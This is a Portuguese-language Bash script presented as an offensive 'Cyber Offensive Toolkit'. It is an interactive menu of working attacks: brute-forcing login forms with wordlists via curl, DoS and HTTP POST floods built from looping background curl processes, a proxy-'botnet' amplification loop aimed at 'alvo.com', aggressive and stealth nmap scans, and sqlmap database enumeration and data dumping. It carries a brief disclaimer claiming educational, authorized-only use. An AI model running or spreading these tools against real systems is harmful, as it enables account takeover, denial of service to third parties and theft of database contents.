#!/bin/bash

# ========================
#   Script de Ataques - by K1r4_fr13nd5
# ========================

LOG_DIR="logs"
mkdir -p "$LOG_DIR"

# === Cores ===
vermelho="\033[1;31m"
reset="\033[0m"
verde="\033[1;32m"
azul="\033[1;34m"
neutro="\033[0m"
# Verifica se o usuário é root
if [[ $EUID -ne 0 ]]; then
    echo -e "${vermelho}[!] Este script deve ser executado como root.${reset}"
    exit 1
fi
# Verifica se as ferramentas necessárias estão instaladas
for tool in curl nmap sqlmap; do
    if ! command -v $tool &> /dev/null; then
        echo -e "${vermelho}[!] A ferramenta $tool não está instalada. Instale-a antes de continuar.${reset}"
        exit 1
    fi
done
# Banner
banner() {
clear
echo -e "\033[1;31m"
cat << "EOF"
 ▄▄▄     ▄▄▄█████▓▄▄▄█████▓ ▄▄▄       ▄████▄   ██ ▄█▀ █    ██  ██▀███   ██▓         █████▒ ██████ 
▒████▄   ▓  ██▒ ▓▒▓  ██▒ ▓▒▒████▄    ▒██▀ ▀█   ██▄█▒  ██  ▓██▒▓██ ▒ ██▒▓██▒       ▓██   ▒▒██    ▒ 
▒██  ▀█▄ ▒ ▓██░ ▒░▒ ▓██░ ▒░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▓██  ▒██░▓██ ░▄█ ▒▒██░       ▒████ ░░ ▓██▄   
░██▄▄▄▄██░ ▓██▓ ░ ░ ▓██▓ ░ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▓▓█  ░██░▒██▀▀█▄  ▒██░       ░▓█▒  ░  ▒   ██▒
 ▓█   ▓██▒ ▒██▒ ░   ▒██▒ ░  ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄▒▒█████▓ ░██▓ ▒██▒░██████▒   ░▒█░   ▒██████▒▒
 ▒▒   ▓▒█░ ▒ ░░     ▒ ░░    ▒▒   ▓▒█░░ ░▒ ▒  ░▒ ▒▒ ▓▒░▒▓▒ ▒ ▒ ░ ▒▓ ░▒▓░░ ▒░▓  ░    ▒ ░   ▒ ▒▓▒ ▒ ░
  ▒   ▒▒ ░   ░        ░      ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░░░▒░ ░ ░   ░▒ ░ ▒░░ ░ ▒  ░    ░     ░ ░▒  ░ ░
  ░   ▒    ░        ░        ░   ▒   ░        ░ ░░ ░  ░░░ ░ ░   ░░   ░   ░ ░       ░ ░   ░  ░  ░  
      ░  ░                       ░  ░░ ░      ░  ░      ░        ░         ░  ░                ░  
EOF
echo -e "\033[0;32m"
echo "┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓"
echo "┃  𝚋𝚢: 【Ｋ１ｒ４＿ｆｒ１３ｎｄ５】⸸ＳＯＣＩＥＤＡＤＥ ＦＲＩＥＮＤＳ    ┃"
echo "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
echo -e "\033[1;32m"
echo "      ╔═══════════════════════════════════════════════════════╗"
echo "      ║      ＡＴＴＡＣＫ ＵＲＬ  -  v1.00.0                  ║"
echo "      ╚═══════════════════════════════════════════════════════╝"
echo -e "\033[0;32m"
echo "     ➤  Scans Automáticos | Ataques Personalizados | Logs Avançados"
echo "     ➤  USE COM RESPONSABILIDADE — Apenas para testes autorizados!"
echo -e "\033[1;32m"
echo "╔═══════════════════════════════════════════════════════════════════════════╗"
echo "║               {★} Sociedade Fr13nd5 | Cyber Offensive Toolkit {★}         ║"
echo "╚═══════════════════════════════════════════════════════════════════════════╝"
echo -e "\033[0m"


}

# Função para ataque de força bruta com menu interativo
forca_bruta() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU DE FORÇA BRUTA ===${neutro}"
        echo "[1] Iniciar ataque padrão"
        echo "[2] Configurar alvo e parâmetros"
        echo "[3] Mostrar histórico de resultados"
        echo "[0] Voltar ao menu principal"
        echo
        read -p "Escolha uma opção: " opt_brute

        case $opt_brute in
            1)
                if [[ -z "$TARGET" || -z "$USER_FIELD" || -z "$PASS_FIELD" || -z "$USERS_FILE" || -z "$PASS_FILE" ]]; then
                    echo -e "${amarelo}[!] Configure o alvo e parâmetros primeiro (Opção 2).${neutro}"
                    sleep 2
                else
                    OUTPUT="$LOG_DIR/forca_bruta_$(date +%d-%m-%Y_%H-%M-%S).txt"
                    echo -e "${azul}[*] Iniciando ataque contra $TARGET...${neutro}"
                    echo "Log em: $OUTPUT"
                    > "$OUTPUT"
                    while read user; do
                        while read pass; do
                            resposta=$(curl -s -X POST -d "$USER_FIELD=$user&$PASS_FIELD=$pass" "$TARGET")
                            if [[ $resposta =~ "Bem-vindo" ]]; then
                                echo "[+] Credenciais encontradas: $user | $pass" | tee -a "$OUTPUT"
                            fi
                        done < "$PASS_FILE"
                    done < "$USERS_FILE"
                    echo -e "${verde}[✔] Ataque finalizado. Resultado salvo em: $OUTPUT${neutro}"
                    read -p "Pressione ENTER para continuar..."
                fi
                ;;
            2)
                read -p "Digite a URL do login alvo (ex.: http://site.com/login): " TARGET
                read -p "Campo de usuário (ex.: username): " USER_FIELD
                read -p "Campo de senha (ex.: password): " PASS_FIELD
                read -p "Arquivo com lista de usuários (padrão: users.txt): " USERS_FILE
                [[ -z "$USERS_FILE" ]] && USERS_FILE="users.txt"
                read -p "Arquivo com lista de senhas (padrão: passwords.txt): " PASS_FILE
                [[ -z "$PASS_FILE" ]] && PASS_FILE="passwords.txt"

                echo -e "${azul}[✔] Configuração salva:${neutro}"
                echo "URL: $TARGET"
                echo "Campo usuário: $USER_FIELD"
                echo "Campo senha: $PASS_FIELD"
                echo "Lista de usuários: $USERS_FILE"
                echo "Lista de senhas: $PASS_FILE"
                sleep 2
                ;;
            3)
                echo -e "${azul}Histórico de ataques em $LOG_DIR:${neutro}"
                ls -1 "$LOG_DIR" | grep forca_bruta || echo "Nenhum histórico encontrado."
                read -p "Pressione ENTER para continuar..."
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                sleep 1
                ;;
        esac
    done
}


# Função para DoS com menu interativo
dos_attack() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU ATAQUE DoS ===${neutro}"
        echo "[1] Definir alvo do ataque"
        echo "[2] Iniciar ataque DoS"
        echo "[3] Parar todos os ataques"
        echo "[4] Mostrar ataques ativos"
        echo "[0] Voltar ao menu principal"
        echo
        read -p "Escolha uma opção: " opt_dos

        case $opt_dos in
            1)
                read -p "Digite a URL ou IP do alvo (ex: http://site.com): " alvo_dos
                export ALVO_DOS="$alvo_dos"
                echo -e "${verde}[✔] Alvo definido como: ${azul}$ALVO_DOS${neutro}"
                sleep 1
                ;;
            2)
                if [[ -z "$ALVO_DOS" ]]; then
                    echo -e "${vermelho}[!] Nenhum alvo definido. Use a opção [1] primeiro.${neutro}"
                else
                    read -p "Quantas conexões simultâneas deseja (ex: 50): " threads
                    echo -e "${vermelho}[!] Iniciando ataque DoS contra ${azul}$ALVO_DOS${neutro}"
                    for ((i=1; i<=threads; i++)); do
                        (while true; do
                            curl -s "$ALVO_DOS" > /dev/null
                        done) &
                    done
                    echo -e "${verde}[✔] $threads threads iniciadas em background.${neutro}"
                fi
                sleep 1
                ;;
            3)
                echo -e "${amarelo}[!] Encerrando todos os processos de ataque...${neutro}"
                pkill -f "curl -s"
                echo -e "${verde}[✔] Todos os ataques foram parados.${neutro}"
                sleep 1
                ;;
            4)
                echo -e "${azul}Processos ativos:${neutro}"
                pgrep -a curl || echo -e "${vermelho}[!] Nenhum ataque ativo.${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                ;;
        esac
    done
}

# Função para gerenciar e usar botnet (Amplificação)
amplificacao() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU BOTNET / AMPLIFICAÇÃO ===${neutro}"
        echo "[1] Ver lista de proxies (botnet.txt)"
        echo "[2] Adicionar proxy"
        echo "[3] Remover proxy"
        echo "[4] Testar proxies ativos"
        echo "[5] Iniciar ataque de amplificação"
        echo "[0] Voltar ao menu principal"
        read -p "Escolha uma opção: " opt_botnet

        case $opt_botnet in
            1)
                echo -e "${azul}Proxies atuais:${neutro}"
                if [[ -s botnet.txt ]]; then
                    cat botnet.txt
                else
                    echo -e "${vermelho}[!] Nenhum proxy configurado.${neutro}"
                fi
                read -p "Pressione ENTER para continuar..."
                ;;
            2)
                read -p "Digite o proxy (IP:PORTA): " proxy
                echo "$proxy" >> botnet.txt
                echo -e "${verde}[+] Proxy adicionado!${neutro}"
                ;;
            3)
                echo -e "${amarelo}Digite o IP:PORTA exato para remover:${neutro}"
                read proxy_remove
                sed -i "/$proxy_remove/d" botnet.txt
                echo -e "${verde}[+] Proxy removido!${neutro}"
                ;;
            4)
                echo -e "${azul}Testando proxies...${neutro}"
                if [[ ! -s botnet.txt ]]; then
                    echo -e "${vermelho}[!] Nenhum proxy encontrado em botnet.txt${neutro}"
                else
                    while read proxy; do
                        timeout 5 curl -s --socks5 $proxy http://google.com > /dev/null && \
                        echo -e "${verde}[OK] $proxy${neutro}" || \
                        echo -e "${vermelho}[FAIL] $proxy${neutro}"
                    done < botnet.txt
                fi
                read -p "Pressione ENTER para continuar..."
                ;;
            5)
                echo -e "${vermelho}[!] Iniciando ataque de amplificação...${neutro}"
                OUTPUT="$LOG_DIR/amplificacao.txt"
                > "$OUTPUT"
                if [[ ! -s botnet.txt ]]; then
                    echo -e "${vermelho}[!] Nenhum proxy configurado.${neutro}"
                else
                    while true; do
                        for ip in $(cat botnet.txt); do
                            curl -s --socks5 $ip http://alvo.com >> "$OUTPUT"
                        done
                    done
                fi
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                ;;
        esac
    done
}


# Função para ataque de inundação (Flood) com menu interativo
flood() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU ATAQUE DE INUNDAÇÃO (FLOOD) ===${neutro}"
        echo "[1] Definir alvo do ataque"
        echo "[2] Definir arquivo de payload"
        echo "[3] Iniciar ataque Flood"
        echo "[4] Parar todos os ataques"
        echo "[5] Mostrar ataques ativos"
        echo "[0] Voltar ao menu principal"
        echo
        read -p "Escolha uma opção: " opt_flood

        case $opt_flood in
            1)
                read -p "Digite a URL ou IP do alvo (ex: http://site.com): " alvo_flood
                export ALVO_FLOOD="$alvo_flood"
                echo -e "${verde}[✔] Alvo definido como: ${azul}$ALVO_FLOOD${neutro}"
                sleep 1
                ;;
            2)
                read -p "Digite o caminho do arquivo de payload (padrão: payload.txt): " arquivo_payload
                if [[ -z "$arquivo_payload" ]]; then
                    arquivo_payload="payload.txt"
                fi
                if [[ ! -f "$arquivo_payload" ]]; then
                    echo -e "${vermelho}[!] Arquivo $arquivo_payload não encontrado!${neutro}"
                else
                    export PAYLOAD_FILE="$arquivo_payload"
                    echo -e "${verde}[✔] Payload definido como: ${azul}$PAYLOAD_FILE${neutro}"
                fi
                sleep 1
                ;;
            3)
                if [[ -z "$ALVO_FLOOD" ]]; then
                    echo -e "${vermelho}[!] Nenhum alvo definido. Use a opção [1] primeiro.${neutro}"
                elif [[ -z "$PAYLOAD_FILE" ]]; then
                    echo -e "${vermelho}[!] Nenhum payload definido. Use a opção [2] primeiro.${neutro}"
                else
                    read -p "Quantas threads (conexões simultâneas) deseja? " threads_flood
                    echo -e "${vermelho}[!] Iniciando ataque Flood contra ${azul}$ALVO_FLOOD${neutro}"
                    for ((i=1; i<=threads_flood; i++)); do
                        (while true; do
                            curl -s -X POST -d @"$PAYLOAD_FILE" "$ALVO_FLOOD" > /dev/null
                        done) &
                    done
                    echo -e "${verde}[✔] $threads_flood threads iniciadas em background.${neutro}"
                fi
                sleep 1
                ;;
            4)
                echo -e "${amarelo}[!] Encerrando todos os processos de ataque...${neutro}"
                pkill -f "curl -s -X POST"
                echo -e "${verde}[✔] Todos os ataques foram parados.${neutro}"
                sleep 1
                ;;
            5)
                echo -e "${azul}Processos ativos:${neutro}"
                pgrep -a curl || echo -e "${vermelho}[!] Nenhum ataque ativo.${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                ;;
        esac
    done
}


# Função para Nmap com menu interativo
scan_nmap() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU DE SCAN NMAP ===${neutro}"
        echo "[1] Scan rápido (-F)"
        echo "[2] Scan completo (todas as portas) (-p-)"
        echo "[3] Scan com detecção de versão (-sV)"
        echo "[4] Scan com scripts NSE padrão (-sC)"
        echo "[5] Scan UDP (-sU)"
        echo "[6] Scan agressivo (-A)"
        echo "[7] Scan furtivo (-sS)"
        echo "[8] Scan personalizado"
        echo "[9] Mostrar histórico de resultados"
        echo "[0] Voltar ao menu principal"
        echo
        read -p "Escolha uma opção: " opt_nmap

        case $opt_nmap in
            1)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_rapido.txt"
                echo -e "${azul}[✔] Executando: nmap -F $alvo${neutro}"
                nmap -F "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            2)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_completo.txt"
                echo -e "${azul}[✔] Executando: nmap -p- $alvo${neutro}"
                nmap -p- "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            3)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_versao.txt"
                echo -e "${azul}[✔] Executando: nmap -sV $alvo${neutro}"
                nmap -sV "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            4)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_scripts.txt"
                echo -e "${azul}[✔] Executando: nmap -sC $alvo${neutro}"
                nmap -sC "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            5)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_udp.txt"
                echo -e "${azul}[✔] Executando: nmap -sU $alvo${neutro}"
                nmap -sU "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            6)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_agressivo.txt"
                echo -e "${azul}[✔] Executando: nmap -A $alvo${neutro}"
                nmap -A "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            7)
                read -p "Digite o alvo: " alvo
                OUTPUT="$LOG_DIR/nmap_furtivo.txt"
                echo -e "${azul}[✔] Executando: nmap -sS $alvo${neutro}"
                nmap -sS "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            8)
                read -p "Digite o alvo: " alvo
                read -p "Digite as opções personalizadas (ex: -sV -p 80,443): " opcoes
                OUTPUT="$LOG_DIR/nmap_personalizado.txt"
                echo -e "${azul}[✔] Executando: nmap $opcoes $alvo${neutro}"
                nmap $opcoes "$alvo" | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            9)
                echo -e "${azul}Arquivos de histórico no diretório $LOG_DIR:${neutro}"
                ls -1 "$LOG_DIR" | grep nmap || echo "Nenhum histórico encontrado."
                read -p "Pressione ENTER para continuar..."
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                sleep 1
                ;;
        esac
    done
}


# Função para SQLMap com menu interativo
scan_sqlmap() {
    while true; do
        clear
        banner
        echo -e "${verde}=== MENU DE SQLMAP ===${neutro}"
        echo "[1] Teste básico de injeção SQL"
        echo "[2] Enumeração de bancos de dados (--dbs)"
        echo "[3] Enumeração de tabelas (--tables)"
        echo "[4] Enumeração de colunas (--columns)"
        echo "[5] Dump de dados (--dump)"
        echo "[6] Ataque de força bruta em login"
        echo "[7] Opções avançadas (personalizar parâmetros)"
        echo "[8] Mostrar histórico de resultados"
        echo "[0] Voltar ao menu principal"
        echo
        read -p "Escolha uma opção: " opt_sqlmap

        case $opt_sqlmap in
            1)
                read -p "Digite a URL vulnerável: " url
                OUTPUT="$LOG_DIR/sqlmap_basico.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch${neutro}"
                sqlmap -u "$url" --batch | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            2)
                read -p "Digite a URL vulnerável: " url
                OUTPUT="$LOG_DIR/sqlmap_dbs.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch --dbs${neutro}"
                sqlmap -u "$url" --batch --dbs | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            3)
                read -p "Digite a URL vulnerável: " url
                read -p "Digite o nome do banco de dados: " db
                OUTPUT="$LOG_DIR/sqlmap_tables_$db.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch -D $db --tables${neutro}"
                sqlmap -u "$url" --batch -D "$db" --tables | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            4)
                read -p "Digite a URL vulnerável: " url
                read -p "Digite o nome do banco de dados: " db
                read -p "Digite o nome da tabela: " table
                OUTPUT="$LOG_DIR/sqlmap_columns_${db}_${table}.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch -D $db -T $table --columns${neutro}"
                sqlmap -u "$url" --batch -D "$db" -T "$table" --columns | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            5)
                read -p "Digite a URL vulnerável: " url
                read -p "Digite o nome do banco de dados: " db
                read -p "Digite a tabela: " table
                OUTPUT="$LOG_DIR/sqlmap_dump_${db}_${table}.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch -D $db -T $table --dump${neutro}"
                sqlmap -u "$url" --batch -D "$db" -T "$table" --dump | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            6)
                read -p "Digite a URL do login vulnerável: " url
                OUTPUT="$LOG_DIR/sqlmap_bruteforce.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url --batch --forms --risk=3 --level=5${neutro}"
                sqlmap -u "$url" --batch --forms --risk=3 --level=5 | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            7)
                read -p "Digite a URL vulnerável: " url
                read -p "Digite as opções personalizadas (ex: --risk=3 --level=5 --dump): " opcoes
                OUTPUT="$LOG_DIR/sqlmap_personalizado.txt"
                echo -e "${azul}[✔] Executando: sqlmap -u $url $opcoes${neutro}"
                sqlmap -u "$url" $opcoes | tee "$OUTPUT"
                echo -e "${verde}[✔] Resultado salvo em: $OUTPUT${neutro}"
                read -p "Pressione ENTER para continuar..."
                ;;
            8)
                echo -e "${azul}Arquivos de histórico no diretório $LOG_DIR:${neutro}"
                ls -1 "$LOG_DIR" | grep sqlmap || echo "Nenhum histórico encontrado."
                read -p "Pressione ENTER para continuar..."
                ;;
            0)
                break
                ;;
            *)
                echo -e "${amarelo}[!] Opção inválida.${neutro}"
                sleep 1
                ;;
        esac
    done
}

# Função para exibir informações dos desenvolvedores
Sobre_os_devs() {
    echo -e "\033[1;34m"
    echo "================================================================================="
    echo -e "\033[1;34m"
    echo -e "\033[0m"
    echo "Desenvolvedores: K1r4_fr13nd5 - Sociedade Fr13nd5"
    echo "Graças ao 4Nub1s, K1r4 viu que editar codigos em BASH não é tão dificil assim."
    echo "E aos poucos, ele foi aprendendo e criando ferramentas incríveis."
    echo "Logo logo terá mais paineis desses de ferramentas totalmente originais dos Fr13nd5."
    echo -e "\033[0m"
    echo -e "\033[1;34m"
    echo "================================================================================="
    echo -e "\033[1;34m"
    echo -e "\033[1;31m"
    echo "================================================================================="
    echo -e "\033[1;31m"
    echo "A ferramenta tem o objetivo de educar e demonstrar vulnerabilidades comuns em sistemas."
    echo "Use com responsabilidade e sempre com permissão do proprietário do sistema."
    echo "================================================================================="
    echo -e "\033[0m"
}

# Função para exibir o conteúdo do README.md no terminal
open_readme() {
    if [[ -f README.md ]]; then
        echo -e "${azul}=== EXIBINDO README.md ===${neutro}"
        cat README.md
        echo -e "\n${verde}[✔] Fim do README.md${neutro}"
    else
        echo -e "${vermelho}[!] Arquivo README.md não encontrado.${neutro}"
    fi
    read -p "Pressione ENTER para continuar..."
}

# === Cores ===
verde="\033[1;32m"
azul="\033[1;34m"
vermelho="\033[1;31m"
amarelo="\033[1;33m"
neutro="\033[0m"

# Menu principal
while true; do
    banner
    echo -e "${verde}Escolha uma opção:${neutro}"
    echo -e "${azul}[1]${neutro} Ataque de Força Bruta"
    echo -e "${azul}[2]${neutro} Ataque DoS (negação de serviço)"
    echo -e "${azul}[3]${neutro} Ataque de Amplificação"
    echo -e "${azul}[4]${neutro} Ataque de Inundação"
    echo -e "${azul}[5]${neutro} Scan com Nmap"
    echo -e "${azul}[6]${neutro} Scan com SQLMap"
    echo -e "${azul}[7]${neutro} Sobre os devs"
    echo -e "${azul}[8]${neutro} Instruções e Ajuda (README.md)"
    echo -e "${azul}[0]${neutro} Sair"
    read -p "Opção: " opcao

    case $opcao in
        1) forca_bruta ;;
        2) dos_attack ;;
        3) amplificacao ;;
        4) flood ;;
        5) scan_nmap ;;
        6) scan_sqlmap ;;
        7) Sobre_os_devs ;;
        8) open_readme ;;
        0) echo -e "${vermelho}Saindo...${neutro}"; exit ;;
        *) echo -e "${amarelo}[!] Opção inválida.${neutro}" ;;
    esac
    read -p "Pressione ENTER para continuar..."
done

# Fim do script
echo -e "${verde}Obrigado por usar a ferramenta!${neutro}"
exit 0
# Fim do script 
